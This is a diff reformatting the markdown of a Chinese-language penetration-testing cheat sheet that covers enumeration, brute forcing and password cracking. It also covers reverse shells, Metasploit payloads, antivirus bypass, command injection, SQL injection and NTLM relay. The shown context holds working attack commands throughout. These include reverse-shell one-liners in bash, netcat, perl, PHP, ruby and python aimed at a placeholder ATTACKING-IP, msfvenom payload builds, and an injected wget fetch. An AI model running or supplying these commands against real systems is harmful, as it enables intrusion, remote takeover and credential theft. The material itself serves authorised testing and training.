@@ -12,9 +12,9 @@ date: 2019-02-09 17:02:18
 ---
 
 
-## <center>枚举</center> ##
+## <center>枚举</center>
 
-### 常规枚举 ###
+### 常规枚举
 
 显示详细信息，同步，扫描所有端口，使用所有脚本，不探测主机是否存活
 
@@ -42,15 +42,20 @@ nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 [host]
 netdiscover -r 192.168.1.0/24
 ```
 
-### FTP (21) ###
+### FTP (21)
+
 ```bash
 nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.1.1
 ```
-### SSH (22) ###
+
+### SSH (22)
+
 ```bash
 ssh [ip] 22
 ```
-### SMTP (25) ###
+
+### SMTP (25)
+
 ```bash
 nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.1.1
 
@@ -59,7 +64,7 @@ nc -nvv [ip] 25
 telnet [ip] 25
 ```
 
-### Web (80/443) ###
+### Web (80/443)
 
 birbuster(GUI)
 
@@ -68,7 +73,7 @@ dirb http://192.168.1.1/
 
 nikto -h 192.168.1.1
 ```
-### Pop3 (110) ###
+### Pop3 (110)
 
 telnet [ip] 110
 
@@ -76,19 +81,17 @@ USER [username]
 
 PASS [password]
 
-列出信息
-`LIST`
+列出信息 `LIST`
 
-查找邮件
-`RETR [message number]`
+查找邮件 `RETR [message number]`
 
-### RPCBind (111) ###
+### RPCBind (111)
 
 ```bash
 rpcinfo –p 192.168.1.1
 ```
 
-### SMB\RPC (139/445) ###
+### SMB\RPC (139/445)
 
 ```bahs
 enum4linux –a 192.168.1.1
@@ -109,13 +112,14 @@ nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes
 ```
 
 列出Ipc共享
+
 ```bash
 smbclient -L //192.168.1.X/
 
 smbclient //192.168.1.X/ipc$ -U user
 ```
 
-### SNMP (161) ###
+### SNMP (161)
 
 ```bash
 snmpwalk -c public -v1 10.0.0.0
@@ -129,7 +133,7 @@ nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
 snmpenum -t 192.168.1.X
 ```
 
-### Oracle (1521) ###
+### Oracle (1521)
 
 ```bash
 tnscmd10g version -h 192.168.X.X
@@ -137,12 +141,13 @@ tnscmd10g version -h 192.168.X.X
 tnscmd10g status -h 192.168.X.X
 ```
 
-### Mysql (3306) ###
+### Mysql (3306)
+
 ```bash
 nmap -sV -Pn -vv  192.168.1.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
 ```
 
-### DNS区域传输 ###
+### DNS区域传输
 
 ```bash
 nslookup -> set type=any -> ls -d baidu.com
@@ -154,21 +159,23 @@ dig axfr baidu.com @ns1.baidu.com
 dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
 ```
 
-### 挂载文件共享 ###
+### 挂载文件共享
 
 `showmount -e`
 
 将共享挂载到/ mnt / nfs而不锁定它
+
 ```bash
 mount 192.168.1.1:/vol/share /mnt/nfs  -nolock
 ```
+
 在Linux上挂载Windows CIFS/SMB共享位于/mnt/cifs如果删除密码，它将在CLI上提示
 
 ```bash
 mount -tcifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs
 ```
 
-### 指纹识别 ###
+### 指纹识别
 
 通过显示横幅进行基本版本控制/指纹识别
 
@@ -177,12 +184,13 @@ nc -v 192.168.1.1 25
 
 telnet 192.168.1.1 25
 ```
-### 搜索利用exp ###
+### 搜索利用exp
 
 ```bash
 searchsploit windows 2003 | grep -i local
 ```
-### 编译EXP ###
+### 编译EXP
+
 编译C代码，在'gcc'之后添加`-m32`，用于在64位Linux上编译32位代码,不添加则编译64位的exp
 
 ```bash
@@ -194,13 +202,15 @@ gcc -o exploit exploit.c
 i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
 ```
 
-### 检测数据包 ###
+### 检测数据包
+
 tcpdump用于接口eth0上的端口80，输出到output.pcap
 
 ```bash
 tcpdump tcp port 80 -w output.pcap -i eth0
 ```
-### 密码破解 ###
+### 密码破解
+
 ```bash
 hash-identifier [hash]
 
@@ -211,7 +221,8 @@ hashcat -m 500 -a 0 -o output.txt –remove hashes.txt /usr/share/wordlists/rock
 https://hashcat.net/wiki/doku.php?id=example_hashes
 https://hashkiller.co.uk/
 
-### 暴力破解 ###
+### 暴力破解
+
 web post表单
 
 ```bash
@@ -228,9 +239,9 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt [ip] [协议]
 hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp –V
 ```
 
-## <center>Shells & Reverse Shells</center> ##
+## <center>Shells & Reverse Shells</center>
 
-### SUID C Shells ###
+### SUID C Shells
 
 **/bin/bash**
 
@@ -250,7 +261,8 @@ system("/bin/sh");
 }
 ```
 
-### TTY Shell ###
+### TTY Shell
+
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 
@@ -265,7 +277,7 @@ execute('/bin/sh')
 "!bash #vi
 ```
 
-### Spawn Ruby Shell ###
+### Spawn Ruby Shell
 
 ```bash
 exec "/bin/sh"
@@ -273,9 +285,9 @@ exec "/bin/sh"
 ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d
 ```
 
-### Netcat ###
+### Netcat
 
-````bash
+```bash
 nc -e /bin/sh ATTACKING-IP 80
 
 /bin/sh | nc ATTACKING-IP 80
@@ -283,7 +295,7 @@ nc -e /bin/sh ATTACKING-IP 80
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 ```
 
-### telnet反弹Shell ###
+### telnet反弹Shell
 
 ```bash
 rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
@@ -291,14 +303,15 @@ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 ```
 
-### PHP ###
+### PHP
 
 假设TCP使用文件描述符3.如果它不起作用，请尝试4,5或6）
+
 ```bash
 php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-### Bash ###
+### Bash
 
 ```bash
 exec /bin/bash 0&0 2>&0
@@ -310,7 +323,7 @@ exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; d
 bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
 ```
 
-### Perl ###
+### Perl
 
 ```bash
 exec "/bin/sh";
@@ -324,27 +337,27 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-## <center>Meterpreter</center> ##
+## <center>Meterpreter</center>
 
-### Windows ###
+### Windows
 
 ```bash
 set payload windows/meterpreter/reverse_tcp
 ```
-### Windows VNV ###
+### Windows VNV
 
 ```bash
 set payload windows/vncinject/reverse_tcp
 
 set ViewOnly false
 ```
-### Linux ###
+### Linux
 
 ```bash
 set payload linux/meterpreter/reverse_tcp
 ```
 
-### msf备忘 ###
+### msf备忘
 
 上传文件
 
@@ -430,13 +443,13 @@ MSSQL有效负载
 
 `set AUTORUNSCRIPT post/windows/manage/migrate`
 
-### msf payloads ###
+### msf payloads
 
 列出选项
 
 `msfvenom –l`
 
-### 二进制 ###
+### 二进制
 
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
@@ -446,7 +459,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
 msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
 ```
 
-### Web payloads ###
+### Web payloads
 
 PHP
 
@@ -480,7 +493,7 @@ WAR
 msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
 ```
 
-### 脚本 payloads ###
+### 脚本 payloads
 
 Python
 
@@ -500,7 +513,7 @@ Perl
 msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
 ```
 
-### shellcode ###
+### shellcode
 
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f
@@ -510,7 +523,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f
 msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
 ```
 
-### Handlers ###
+### Handlers
 msf常用
 
 ```bash
@@ -532,7 +545,7 @@ exploit -j -z
 msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f > exploit.extension
 ```
 
-## <center>Powershell</center> ##
+## <center>Powershell</center>
 
 执行旁路
 
@@ -553,15 +566,15 @@ Powershell.exe被阻止
 
 Use 'not powershell' https://github.com/Ben0xA/nps
 
-## <center>提权</center> ##
+## <center>提权</center>
 
-### Linux ###
+### Linux 
 
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 
 https://github.com/pentestmonkey/unix-privesc-check
 
-### Windows ###
+### Windows 
 
 https://github.com/pentestmonkey/windows-privesc-check
 
@@ -569,36 +582,36 @@ http://www.fuzzysecurity.com/tutorials/16.html
 
 https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
 
-## <center>命令行注入</center> ##
+## <center>命令行注入</center>
 
-### 遍历文件 ##
+### 遍历文件
 
 `website.com/file.php[?path=/]`
 
-### 使用curl探测HTTP options ###
+### 使用curl探测HTTP options
 
 `curl -vX OPTIONS [website]`
 
-### 使用CURL将文件上传到具有PUT方法的网站 ###
+### 使用CURL将文件上传到具有PUT方法的网站
 
 ```bash
 curl --upload-file shell.php --url http://192.168.218.139/test/shell.php --http1.0
 ```
-### 传输文件 ###
+### 传输文件
 
 ```bash
 ?path=/;wget http://IPADDRESS:8000/FILENAME.EXTENTION;
 ```
 
-### 连接shell ###
+### 连接shell
 
 ```bash
 ;php -f filelocation.php
 ```
 
-## <center>SQL注入</center> ##
+## <center>SQL注入</center>
 
-### 注入 ###
+### 注入
 
 登录表单的常见注入:
 
@@ -612,7 +625,7 @@ curl --upload-file shell.php --url http://192.168.218.139/test/shell.php --http1
 - ') or ('1'='1---
 
 
-### SQLMap ###
+### SQLMap
 
 自动sqlmap扫描
 
@@ -664,7 +677,7 @@ Post
 sqlmap -r demo.txt
 ```
 
-## 其他 ##
+## 其他
 
 使用mitm6的NTLMRelayx.py
 
@@ -676,7 +689,7 @@ mitm6 -d <domain.local>
 ntlmrelayx.py -6 -wh 192.168.1.1 -t smb://192.168.1.2 -l ~/tmp/
 ```
 
-### 隧道 ###
+### 隧道
 
 sshuttle是一个很棒的隧道工具，它摆脱了对代理链的需求。以下命令的作用是通过10.0.0.1隧道传输流量，并为通过sshuttle隧道发往10.10.10.0/24的所有流量建立路由。
 
@@ -684,26 +697,26 @@ sshuttle是一个很棒的隧道工具，它摆脱了对代理链的需求。以
 sshuttle -r root@10.0.0.1 10.10.10.0/24
 ```
 
-### AV Bypass ###
+### AV Bypass
 
 需要安装wine和hyperion。
 
 ```bash
 wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe
 ```
-### Web主机（传输文件） ###
+### Web主机（传输文件
 
 ```bash
 python -m SimpleHTTPServer 80
 ```
 
-### PHP msf shell ###
+### PHP msf shell
 
 ```bash
 msfvenom -p php/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 R > phpmeterpreter.php
 ```
 
-### Netcat ###
+### Netcat
 
 监听
 
@@ -722,7 +735,7 @@ cat happy.txt | ncat -v -l -p 5555
 ncat localhost 5555 > happy_copy.txt 
 ```
 
-### 使用解释器反弹shell ###
+### 使用解释器反弹shell
 
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
@@ -736,7 +749,7 @@ python -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
 python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
 ```
 
-### Shellshock ###
+### Shellshock
 
 CURL
 
